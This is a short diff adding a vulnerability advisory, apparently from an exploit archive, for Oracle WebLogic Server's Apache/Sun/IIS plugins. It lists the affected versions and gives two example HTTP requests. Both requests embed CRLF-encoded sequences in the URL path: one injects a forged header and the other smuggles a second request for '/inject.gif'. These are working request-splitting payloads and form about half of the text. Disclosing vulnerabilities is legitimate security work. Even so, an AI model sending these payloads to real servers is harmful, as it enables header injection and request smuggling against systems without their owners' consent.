@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/41620/info
+
+Oracle WebLogic Server is prone to a remote vulnerability.
+
+The vulnerability can be exploited over the 'HTTP' protocol. For an exploit to succeed, the attacker must have 'Plugins for Apache, Sun and IIS web servers' privileges.
+
+This vulnerability affects the following supported versions:
+7.0 SP7, 8.1 SP6, 9.0, 9.1, 9.2 MP3, 10.0 MP2, 10.3.2, 10.3.3 
+
+The following example requests are available:
+
+GET /logo.gif%20HTTP/1.1%0d%0aX-hdr:%20x HTTP/1.1
+Host: vulnerable.example.com
+Connection: close
+
+GET /logo.gif%20HTTP/1.1%0d%0aHost:%20vulnerable.example.com%0d%0a%0d%0aGET%20/inject.gif HTTP/1.1
+Host: vulnerable.example.com
+
